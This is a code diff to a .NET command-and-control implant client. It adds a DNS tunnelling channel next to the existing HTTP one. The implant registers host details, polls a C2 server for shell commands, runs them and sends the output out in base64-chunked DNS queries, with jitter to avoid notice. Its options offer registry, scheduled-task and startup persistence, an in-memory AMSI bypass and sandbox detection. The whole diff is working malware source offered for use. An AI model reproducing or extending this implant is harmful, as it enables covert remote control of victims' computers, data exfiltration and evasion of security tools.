@@ -256,21 +256,74 @@ public static class Executor
     }
 }
 
-// ── Agent core ───────────────────────────────────────────────────────
+// ── Agent interface ──────────────────────────────────────────────────
 
-public class Agent
+public interface IAgent
+{
+    string Description { get; }
+    Task<string?> RegisterAsync();
+    Task<List<CommandEntry>> BeaconAsync(string targetId);
+    Task ReportAsync(string targetId, string commandId, string output);
+}
+
+public static class AgentRunner
+{
+    public static async Task RunLoopAsync(IAgent agent, int intervalMs, double jitter)
+    {
+        var rng = new Random();
+        Console.WriteLine($"[*] C2 Client (.NET) — {agent.Description}");
+
+        string? targetId = null;
+        while (targetId == null)
+        {
+            Console.WriteLine("[*] Registering ...");
+            targetId = await agent.RegisterAsync();
+            if (targetId != null)
+            {
+                Console.WriteLine($"[+] Registered as {targetId}");
+                break;
+            }
+            Console.WriteLine("[-] Registration failed, retrying ...");
+            await Task.Delay(intervalMs);
+        }
+
+        while (true)
+        {
+            try
+            {
+                var commands = await agent.BeaconAsync(targetId);
+                foreach (var cmd in commands)
+                {
+                    if (string.IsNullOrWhiteSpace(cmd.Command)) continue;
+                    Console.WriteLine($"[>] Executing {cmd.Id[..Math.Min(8, cmd.Id.Length)]}...");
+                    var output = Executor.Run(cmd.Command);
+                    Console.WriteLine($"[<] Result ({output.Length} bytes)");
+                    await agent.ReportAsync(targetId, cmd.Id, output);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Beacon error: {ex.Message}");
+            }
+
+            var sleep = intervalMs * (1.0 + jitter * (2.0 * rng.NextDouble() - 1.0));
+            await Task.Delay(Math.Max(1000, (int)sleep));
+        }
+    }
+}
+
+// ── HTTP Agent ──────────────────────────────────────────────────────
+
+public class HttpAgent : IAgent
 {
     private readonly HttpClient _http;
     private readonly string _baseUrl;
-    private readonly int _intervalMs;
-    private readonly double _jitter;
-    private readonly Random _rng = new();
 
-    public Agent(string server, int intervalSeconds, double jitter)
+    public string Description => $"HTTP channel → {_baseUrl}";
+
+    public HttpAgent(string server)
     {
         _baseUrl = $"http://{server}/api/v1/agent";
-        _intervalMs = intervalSeconds * 1000;
-        _jitter = jitter;
         _http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
     }
 
@@ -319,48 +372,230 @@ public class Agent
         }
         catch { /* swallow — will retry on next beacon */ }
     }
+}
 
-    public async Task RunLoopAsync()
+// ── DNS helpers ─────────────────────────────────────────────────────
+
+public static class DnsHelper
+{
+    private const int DnsChunkSize = 50;
+
+    public static byte[] BuildQuery(string qname, ushort qtype = 16)
     {
-        Console.WriteLine($"[*] C2 Client (.NET) — connecting to {_baseUrl}");
-
-        // Register
-        string? targetId = null;
-        while (targetId == null)
+        using var ms = new MemoryStream();
+        using var w = new BinaryWriter(ms);
+        // Transaction ID
+        var rng = new Random();
+        w.Write((byte)(rng.Next(256))); w.Write((byte)(rng.Next(256)));
+        // Flags: standard query, RD=1
+        w.Write((byte)0x01); w.Write((byte)0x00);
+        // QDCOUNT=1, rest=0
+        w.Write((byte)0x00); w.Write((byte)0x01);
+        w.Write((byte)0x00); w.Write((byte)0x00);
+        w.Write((byte)0x00); w.Write((byte)0x00);
+        w.Write((byte)0x00); w.Write((byte)0x00);
+        // QNAME
+        foreach (var label in qname.Split('.'))
         {
-            Console.WriteLine("[*] Registering ...");
-            targetId = await RegisterAsync();
-            if (targetId != null)
+            var bytes = Encoding.ASCII.GetBytes(label);
+            w.Write((byte)bytes.Length);
+            w.Write(bytes);
+        }
+        w.Write((byte)0x00);
+        // QTYPE, QCLASS IN
+        w.Write((byte)(qtype >> 8)); w.Write((byte)(qtype & 0xFF));
+        w.Write((byte)0x00); w.Write((byte)0x01);
+        return ms.ToArray();
+    }
+
+    public static List<string> ParseTxtResponse(byte[] data, int length)
+    {
+        var results = new List<string>();
+        if (length < 12) return results;
+        int qdcount = (data[4] << 8) | data[5];
+        int ancount = (data[6] << 8) | data[7];
+
+        int off = 12;
+        for (int q = 0; q < qdcount; q++)
+        {
+            while (off < length)
             {
-                Console.WriteLine($"[+] Registered as {targetId}");
-                break;
+                byte l = data[off];
+                if (l == 0) { off++; break; }
+                if (l >= 0xC0) { off += 2; break; }
+                off += 1 + l;
             }
-            Console.WriteLine("[-] Registration failed, retrying ...");
-            await Task.Delay(_intervalMs);
+            off += 4;
         }
 
-        // Beacon loop
-        while (true)
+        for (int a = 0; a < ancount; a++)
+        {
+            if (off >= length) break;
+            if (data[off] >= 0xC0) off += 2;
+            else { while (off < length && data[off] != 0) off += 1 + data[off]; off++; }
+
+            if (off + 10 > length) break;
+            int rtype = (data[off] << 8) | data[off + 1];
+            int rdlength = (data[off + 8] << 8) | data[off + 9];
+            off += 10;
+
+            if (rtype == 16)
+            {
+                int end = off + rdlength;
+                int pos = off;
+                while (pos < end && pos < length)
+                {
+                    int slen = data[pos++];
+                    if (pos + slen > length) break;
+                    results.Add(Encoding.ASCII.GetString(data, pos, slen));
+                    pos += slen;
+                }
+            }
+            off += rdlength;
+        }
+        return results;
+    }
+
+    public static List<string> Query(string qname, string serverIp, int port, int retries = 3)
+    {
+        var pkt = BuildQuery(qname);
+        for (int attempt = 0; attempt < retries; attempt++)
         {
             try
             {
-                var commands = await BeaconAsync(targetId);
-                foreach (var cmd in commands)
-                {
-                    if (string.IsNullOrWhiteSpace(cmd.Command)) continue;
-                    Console.WriteLine($"[>] Executing {cmd.Id[..Math.Min(8, cmd.Id.Length)]}...");
-                    var output = Executor.Run(cmd.Command);
-                    Console.WriteLine($"[<] Result ({output.Length} bytes)");
-                    await ReportAsync(targetId, cmd.Id, output);
-                }
+                using var udp = new UdpClient();
+                udp.Client.ReceiveTimeout = 10_000;
+                var ep = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(serverIp), port);
+                udp.Send(pkt, pkt.Length, ep);
+                System.Net.IPEndPoint? remote = null;
+                var resp = udp.Receive(ref remote!);
+                return ParseTxtResponse(resp, resp.Length);
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[-] Beacon error: {ex.Message}");
-            }
+            catch { Thread.Sleep(2000); }
+        }
+        return new();
+    }
 
-            var sleep = _intervalMs * (1.0 + _jitter * (2.0 * _rng.NextDouble() - 1.0));
-            await Task.Delay(Math.Max(1000, (int)sleep));
+    public static List<string> ChunkB64(string b64)
+    {
+        var chunks = new List<string>();
+        for (int i = 0; i < b64.Length; i += DnsChunkSize)
+            chunks.Add(b64.Substring(i, Math.Min(DnsChunkSize, b64.Length - i)));
+        if (chunks.Count == 0) chunks.Add("");
+        return chunks;
+    }
+
+    public static string ToUrlSafeBase64(byte[] data)
+    {
+        return Convert.ToBase64String(data)
+            .Replace('+', '-').Replace('/', '_').TrimEnd('=');
+    }
+
+    public static byte[] FromBase64(string b64)
+    {
+        // Normalize urlsafe back to standard
+        var s = b64.Replace('-', '+').Replace('_', '/');
+        switch (s.Length % 4)
+        {
+            case 2: s += "=="; break;
+            case 3: s += "="; break;
+        }
+        return Convert.FromBase64String(s);
+    }
+}
+
+// ── DNS Agent ───────────────────────────────────────────────────────
+
+public class DnsAgent : IAgent
+{
+    private readonly string _serverIp;
+    private readonly int _port;
+    private readonly string _domain;
+
+    public string Description => $"DNS channel → {_serverIp}:{_port} domain={_domain}";
+
+    public DnsAgent(string serverIp, int port, string domain)
+    {
+        _serverIp = serverIp;
+        _port = port;
+        _domain = domain;
+    }
+
+    public async Task<string?> RegisterAsync()
+    {
+        var req = new RegisterRequest(
+            SysInfo.GetHostname(),
+            SysInfo.GetIp(),
+            SysInfo.GetMac(),
+            SysInfo.GetOs(),
+            "dns"
+        );
+        var json = JsonSerializer.Serialize(req, AppJsonContext.Default.RegisterRequest);
+        var b64 = DnsHelper.ToUrlSafeBase64(Encoding.UTF8.GetBytes(json));
+        var chunks = DnsHelper.ChunkB64(b64);
+        int total = chunks.Count;
+
+        // Send all chunks except last
+        for (int i = 0; i < total - 1; i++)
+        {
+            var qname = $"{chunks[i]}.{i}.{total}.reg.{_domain}";
+            DnsHelper.Query(qname, _serverIp, _port);
+            await Task.Delay(50);
+        }
+
+        // Send last chunk — response contains target_id
+        var lastQname = $"{chunks[total - 1]}.{total - 1}.{total}.reg.{_domain}";
+        var txts = DnsHelper.Query(lastQname, _serverIp, _port);
+        if (txts.Count == 0) return null;
+
+        try
+        {
+            var respB64 = string.Join("", txts);
+            var decoded = Encoding.UTF8.GetString(DnsHelper.FromBase64(respB64));
+            // Minimal JSON parse for target_id
+            var doc = JsonDocument.Parse(decoded);
+            return doc.RootElement.GetProperty("target_id").GetString();
+        }
+        catch { return null; }
+    }
+
+    public Task<List<CommandEntry>> BeaconAsync(string targetId)
+    {
+        var qname = $"{targetId}.poll.{_domain}";
+        var txts = DnsHelper.Query(qname, _serverIp, _port);
+        var result = new List<CommandEntry>();
+        if (txts.Count == 0) return Task.FromResult(result);
+
+        try
+        {
+            var b64 = string.Join("", txts);
+            var decoded = Encoding.UTF8.GetString(DnsHelper.FromBase64(b64));
+            var doc = JsonDocument.Parse(decoded);
+            if (doc.RootElement.TryGetProperty("id", out var idEl))
+            {
+                result.Add(new CommandEntry
+                {
+                    Id = idEl.GetString() ?? "",
+                    Command = doc.RootElement.TryGetProperty("command", out var cmdEl)
+                        ? cmdEl.GetString() ?? "" : ""
+                });
+            }
+        }
+        catch { }
+        return Task.FromResult(result);
+    }
+
+    public async Task ReportAsync(string targetId, string commandId, string output)
+    {
+        var b64 = DnsHelper.ToUrlSafeBase64(Encoding.UTF8.GetBytes(output));
+        var chunks = DnsHelper.ChunkB64(b64);
+        int total = chunks.Count;
+
+        for (int i = 0; i < total; i++)
+        {
+            var qname = $"{chunks[i]}.{i}.{total}.{commandId}.res.{_domain}";
+            DnsHelper.Query(qname, _serverIp, _port);
+            await Task.Delay(50);
         }
     }
 }
@@ -380,6 +615,9 @@ public static class Program
         string server    = Environment.GetEnvironmentVariable("C2_SERVER") ?? BuildConfig.Server;
         int    interval  = BuildConfig.Interval;
         double jitter    = BuildConfig.Jitter;
+        string channel   = BuildConfig.Channel;
+        string dnsDomain = BuildConfig.DnsDomain;
+        int    dnsPort   = BuildConfig.DnsPort;
         string persist   = "none";     // none | registry | schtask | startup
         bool   amsi      = false;
         bool   sandbox   = false;
@@ -398,6 +636,15 @@ public static class Program
                     break;
                 case "--jitter" or "-j":
                     if (i + 1 < args.Length) double.TryParse(args[++i], out jitter);
+                    break;
+                case "--channel" or "-c":
+                    if (i + 1 < args.Length) channel = args[++i];
+                    break;
+                case "--dns-domain":
+                    if (i + 1 < args.Length) dnsDomain = args[++i];
+                    break;
+                case "--dns-port":
+                    if (i + 1 < args.Length) int.TryParse(args[++i], out dnsPort);
                     break;
                 case "--persist":
                     if (i + 1 < args.Length) persist = args[++i];
@@ -453,8 +700,18 @@ public static class Program
                 break;
         }
 
-        var agent = new Agent(server, interval, jitter);
-        await agent.RunLoopAsync();
+        IAgent agent;
+        if (channel == "dns")
+        {
+            // Extract IP from server (strip port if present)
+            var ip = server.Contains(':') ? server[..server.IndexOf(':')] : server;
+            agent = new DnsAgent(ip, dnsPort, dnsDomain);
+        }
+        else
+        {
+            agent = new HttpAgent(server);
+        }
+        await AgentRunner.RunLoopAsync(agent, interval * 1000, jitter);
     }
 
     private static void PrintUsage()
@@ -465,6 +722,9 @@ Options:
   -s, --server <host:port>   C2 server (default: 127.0.0.1:8000)
   -i, --interval <sec>       Beacon interval (default: 10)
   -j, --jitter <0-1>         Jitter factor (default: 0.3)
+  -c, --channel <http|dns>   Communication channel (default: http)
+  --dns-domain <domain>       DNS C2 domain (default: c2.local)
+  --dns-port <port>           DNS server port (default: 15353)
   --persist <method>          none | registry | schtask | startup
   --amsi-bypass               Patch AMSI in memory
   --sandbox-check             Exit if VM/sandbox detected
